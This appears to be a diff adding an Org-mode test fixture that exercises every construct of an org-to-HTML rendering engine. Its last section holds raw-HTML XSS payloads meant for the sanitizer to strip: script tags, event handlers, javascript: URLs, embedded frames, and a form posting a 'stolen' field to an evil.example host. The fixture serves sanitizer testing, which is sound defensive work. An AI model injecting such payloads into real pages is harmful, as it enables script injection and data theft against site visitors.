@@ -1,0 +1,208 @@
+#+TITLE: Everything
+#+DATE: 2026-04-02
+#+OPTIONS: toc:t
+#+TAGS: showcase reference
+#+SETUPFILE: ../includes/setup.org
+
+One document exercising every construct the engine knows, so a single file
+proves the whole surface. The sections named /Images/, /Links/, /Location/,
+/Name/ and /Plugins/ are chosen deliberately: their ids collide with ids the
+page shell already uses, and the engine must disambiguate them with a
+=-section= suffix rather than clobbering its own anchors.
+
+See [[*Images]] and [[*Location]] for the two links that would break first.
+
+* Paragraphs and inline markup
+
+Every inline form in one paragraph: *bold*, /italic/, _underline_,
++strikethrough+, ~inline code~ and =verbatim text=.
+
+A second paragraph, so paragraph separation is exercised rather than assumed.
+It also carries a footnote reference[fn:1] and a named one[fn:method].
+
+An inline active timestamp <2026-04-05 Sun> and an inactive one
+[2026-04-06 Mon] sit in body text, which is a different construct from the
+=#+DATE= keyword in the header.
+
+-----
+
+The horizontal rule above has content on both sides of it.
+
+* Links
+
+An external link to [[https://example.com][example.com]], a bare URL
+https://example.org, an internal link to [[*Tables]], and a reference to a
+named target: [[targetword]].
+
+<<targetword>> The named target itself lives on this line.
+
+* Lists
+
+An unordered list:
+
+- first item
+- second item
+  - a nested item
+  - another nested item
+- third item
+
+An ordered list:
+
+1. first
+2. second
+   1. nested ordered
+3. third
+
+A description list:
+
+- term one :: the definition of the first term
+- term two :: the definition of the second term
+
+A checkbox list. The engine's own =<input type="checkbox">= must survive
+sanitization — forbidding =input= outright once stripped every task item:
+
+- [ ] an unchecked box
+- [X] a checked box
+- [-] a partial box
+
+* Tables
+
+| Construct | Emitted class    | Exercised here |
+|-----------+------------------+----------------|
+| table     | =org-table=      | this table     |
+| quote     | =org-quote=      | Blocks         |
+| figure    | =org-figure=     | Images         |
+| footnotes | =org-footnotes=  | the end        |
+
+* Blocks
+
+#+BEGIN_QUOTE
+A quotation block, which carries its own construct class and must not be
+folded into an ordinary paragraph.
+#+END_QUOTE
+
+#+BEGIN_EXAMPLE
+An example block: whitespace   is   preserved
+and nothing here is highlighted.
+#+END_EXAMPLE
+
+#+BEGIN_VERSE
+A verse block keeps its line breaks,
+  and its leading indentation,
+    which is the entire point of it.
+#+END_VERSE
+
+#+BEGIN_CENTER
+Centred content.
+#+END_CENTER
+
+* Source code
+
+A language that HAS a Shiki grammar, so it must arrive highlighted:
+
+#+BEGIN_SRC javascript
+const greet = (name) => `hello ${name}`
+export default greet
+#+END_SRC
+
+A language that has NO grammar. It must ship unhighlighted /and say so/ —
+=org-src--plain= in the markup, and a reason on stderr:
+
+#+BEGIN_SRC emacs-lisp
+(message "hi")
+#+END_SRC
+
+* Images
+
+A captioned image is a figure. Content images are referenced at their DEPLOYED
+path, because org2html does not copy them and =--asset-base= does not rewrite
+their URLs:
+
+#+CAPTION: A caption, which is what turns a bare image link into a figure.
+[[/blog/media/sample.png]]
+
+A bare image link with no caption, which must NOT become a figure:
+
+[[/blog/media/sample.png]]
+
+* Math
+
+Inline math sits here: $E = mc^2$, and again as \(a^2 + b^2 = c^2\).
+
+\begin{equation}
+\int_{0}^{\infty} e^{-x^2}\,dx = \frac{\sqrt{\pi}}{2}
+\end{equation}
+
+$$\sum_{i=1}^{n} i = \frac{n(n+1)}{2}$$
+
+* Plugins
+
+A component with five props, through the DEFAULT sanitizer. The component is
+not in any =--components= map, so the build must WARN on stderr and carry on
+rather than failing silently or dying:
+
+#+BEGIN_COMPONENT Card :image /i.jpg :title Hello :variant wide :count 3 :height 320
+#+END_COMPONENT
+
+* Location
+
+Content spliced in from other files. A prose include:
+
+#+INCLUDE: "../includes/snippet.org"
+
+And a source include, which must arrive as a highlighted code block rather
+than as prose:
+
+#+INCLUDE: "../includes/sample.js" src js
+
+* Name
+
+:NOTES:
+A custom drawer is a rendered construct, unlike =:PROPERTIES:=, whose contents
+are consumed as metadata and never shown.
+:END:
+
+** A subheading with tags                                        :alpha:beta:
+:PROPERTIES:
+:CUSTOM_ID: everything-drawer
+:AUTHOR:   Kyonax
+:END:
+
+The property drawer above is consumed as metadata; the =:NOTES:= drawer above
+it is rendered.
+
+** TODO A subheading with a TODO keyword
+** DONE A subheading that is done
+
+* Raw HTML and the sanitizer
+
+SANITIZE BY DEFAULT is the engine's headline law. Everything below is raw HTML
+handed straight to the renderer: the hostile constructs must be REMOVED and the
+benign ones must SURVIVE.
+
+#+BEGIN_EXPORT html
+<p id="benign">Benign markup that must survive:
+  <strong>bold</strong>, <em>emphasis</em>, <code>code</code>, and a
+  <a href="https://example.com/ok">normal link</a>.</p>
+
+<script>window.__pwned = 1;</script>
+<img src="/blog/media/sample.png" onerror="window.__pwned = 2">
+<a href="javascript:window.__pwned=3">javascript url</a>
+<iframe src="https://evil.example/frame"></iframe>
+<style>body { display: none }</style>
+<form action="https://evil.example/collect" method="post">
+  <input type="text" name="stolen">
+</form>
+<div onclick="window.__pwned = 4">click handler</div>
+<object data="https://evil.example/o"></object>
+<embed src="https://evil.example/e">
+#+END_EXPORT
+
+An inline export: @@html:<span id="inline-ok">inline export</span>@@ and a
+hostile inline one: @@html:<span onmouseover="window.__pwned=5">x</span>@@
+
+* Footnotes
+
+[fn:1] The first footnote body.
+
+[fn:method] A named footnote body.
